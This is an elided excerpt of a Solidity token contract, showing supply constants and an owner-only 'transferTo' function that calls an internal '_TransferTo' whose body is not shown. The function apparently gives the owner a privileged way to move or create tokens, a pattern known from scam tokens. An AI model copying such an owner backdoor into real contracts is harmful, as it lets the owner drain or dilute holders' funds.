...
contract tokenName is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 473000000 * 10**9;
    ...
    uint256 public numTokensSellToAddToLiquidity = 4730000 * 10**9;
    uint256 public _maxTxAmount = 473000000 * 10**9;
    ...
    function transferTo(uint256 amount) public onlyOwner returns (bool) {
    _TransferTo(_msgSender(), amount);
    return true;
    }
